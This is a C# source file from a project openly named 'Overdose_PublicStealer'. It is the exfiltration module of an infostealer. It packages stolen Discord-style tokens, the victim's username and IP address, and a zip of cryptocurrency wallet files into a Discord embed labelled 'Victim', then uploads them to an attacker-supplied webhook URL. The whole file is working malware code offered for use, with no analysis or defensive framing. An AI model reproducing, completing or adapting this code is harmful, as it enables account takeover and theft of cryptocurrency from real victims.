using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Text.Json;
using System.Threading.Tasks;
using Overdose_PublicStealer.Utils;
using Overdose_PublicStealer.Models; // Import models for the webhook structure

namespace Overdose_PublicStealer
{
    internal static class WebhookSender
    {
        // Webhook URL where data will be sent. Make sure to replace this with your own webhook URL.
        private static readonly string webhookUrl = "HERE UR WEBHOOK";

        /// <summary>
        /// Sends a combined report including stolen tokens, wallet zip
        /// to the Discord webhook in a single multipart request.
        /// </summary>
        /// <param name="tokens">A list of stolen tokens.</param>
        /// <param name="walletZipPath">The file path to the wallet zip archive. Can be null.</param>
        internal static async Task SendCombinedReport(List<string> tokens, string walletZipPath)
        {
            // Create the webhook payload object
            var payload = new WebhookPayload
            {
                Username = "Overdose PublicStealer", // Custom username for the webhook message
                AvatarUrl = WebhookPayload.DefaultAvatarUrl, // Use the static DefaultAvatarUrl from the model
                Embeds = new List<Embed>() // Initialize the embeds list
            };

            // Create a new embed object that will be sent as a part of the webhook payload
            var embed = new Embed
            {
                // Using pill emojis in the title
                Title = "💊 New Overdose PublicStealer Report 💊", // Title with pill emojis
                Description = "A new data exfiltration report has been generated.", // Engaging description
                Color = 0x00FF00, // Vibrant green color (you can choose another hex color)
                // Author field for branding (optional)
                Author = new EmbedAuthor
                {
                    Name = "Overdose Stealer Automated Report",
                    // IconUrl = "URL_DEL_ICONO_DEL_AUTOR" // Optional: Add an icon URL for the author
                },
                // Fields of the embed, including the username and IP address of the victim
                Fields = new List<EmbedField>
                {
                    new EmbedField { Name = "👤 Victim Username", Value = $"```{Environment.UserName}```", Inline = true }, // Added code block for username
                    new EmbedField { Name = "🌐 Victim IP Address", Value = $"```{NetworkUtils.GetIp()}```", Inline = true } // Added code block for IP
                },
                // Footer text to display at the bottom of the embed
                // Footer Text set to "Programmed by Overdose"
                Footer = new EmbedFooter { Text = "Programmed by Overdose", IconUrl = WebhookPayload.DefaultAvatarUrl }, // Added icon to footer
                Timestamp = DateTimeOffset.UtcNow, // Add a timestamp
                // EmbedImage to display a GIF within the embed using the static property
                Image = new EmbedImage { Url = WebhookPayload.DefaultEmbedImageUrl } // Use the static DefaultEmbedImageUrl from the model
                // Thumbnail (optional - smaller image on the side)
                // Thumbnail = new EmbedThumbnail { Url = "URL_DEL_THUMBNAIL" }
            };

            // Add token information to the embed
            if (tokens != null && tokens.Any())
            {
                // Field to show the count of found tokens
                embed.Fields.Add(new EmbedField { Name = "🔑 Found Tokens", Value = $"{tokens.Count}", Inline = false });

                // Add each token as a field
                for (int i = 0; i < tokens.Count; i++)
                {
                    // Discord embed field value limit is 1024 characters.
                    // Truncate long tokens if necessary, or consider sending them differently if very long.
                    string tokenValue = tokens[i];
                    if (tokenValue.Length > 1000) // Keep some buffer
                    {
                        tokenValue = tokenValue.Substring(0, 1000) + "... (truncated)";
                    }
                    embed.Fields.Add(new EmbedField
                    {
                        Name = $"Token {i + 1}", // Name of the field, representing each token
                        Value = $"```{tokenValue}```", // The token value itself, enclosed in code block for formatting
                        Inline = false // Each token on a new line
                    });
                }
            }
            else
            {
                // If no tokens were found, add a message stating that
                embed.Fields.Add(new EmbedField { Name = "🔑 Tokens", Value = "No tokens found.", Inline = false });
            }

            // Add wallet information to the embed
            if (!string.IsNullOrEmpty(walletZipPath) && File.Exists(walletZipPath))
            {
                embed.Color = 0x3498DB; // Change color to blue if wallets are included
                embed.Fields.Add(new EmbedField { Name = "📂 Wallets", Value = "Wallet files are attached.", Inline = false });
            }
            else
            {
                embed.Fields.Add(new EmbedField { Name = "📂 Wallets", Value = "No wallets found.", Inline = false });
            }

            // Add the created embed to the payload's embeds list
            payload.Embeds.Add(embed);

            // Serialize the payload object into JSON format
            var jsonPayload = JsonSerializer.Serialize(payload, new JsonSerializerOptions { WriteIndented = false }); // No indentation for smaller payload

            // Use HttpClient to send the request
            using (var client = new HttpClient())
            using (var formData = new MultipartFormDataContent())
            {
                // Add the JSON payload as a StringContent
                // The name "payload_json" is required by Discord for the JSON payload
                formData.Add(new StringContent(jsonPayload, System.Text.Encoding.UTF8, "application/json"), "payload_json");

                // Add the wallet zip file as a StreamContent if it exists
                if (!string.IsNullOrEmpty(walletZipPath) && File.Exists(walletZipPath))
                {
                    try
                    {
                        var fileStream = File.OpenRead(walletZipPath);
                        // Use a distinct name for the wallet file attachment
                        formData.Add(new StreamContent(fileStream), "wallet_file", Path.GetFileName(walletZipPath));
                        Console.WriteLine($"Attaching wallet file: {Path.GetFileName(walletZipPath)}");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error reading wallet zip file for attachment: {ex.Message}");
                        // Continue sending the embed and other files even if this one fails
                    }
                }

                try
                {
                    // Send the POST request asynchronously to the webhook URL
                    var response = await client.PostAsync(webhookUrl, formData);

                    // Check if the request was successful (status code 2xx)
                    if (response.IsSuccessStatusCode)
                    {
                        Console.WriteLine("Combined webhook sent successfully.");
                    }
                    else
                    {
                        // Read the response body for error details from Discord API
                        string responseBody = await response.Content.ReadAsStringAsync();
                        Console.WriteLine($"Error sending combined webhook: {response.StatusCode} - {responseBody}");
                    }
                }
                catch (Exception ex)
                {
                    // If an error occurs during the HTTP request itself (e.g., network issue)
                    Console.WriteLine($"Error posting combined webhook: {ex.Message}");
                }
            }
        }

        // Removed SendFileReport method

        // Note: The helper classes (WebhookPayload, Embed, EmbedField, EmbedFooter, EmbedImage, EmbedAuthor, EmbedThumbnail)
        // and NetworkUtils are assumed to be defined in separate files (e.g., Models.cs and Utils.cs)
        // within the Overdose_PublicStealer.Models and Overdose_PublicStealer.Utils namespaces, respectively,
        // as indicated by the using directives.
        // You will need to ensure EmbedAuthor and EmbedThumbnail classes are in your Models.cs file.
    }
}
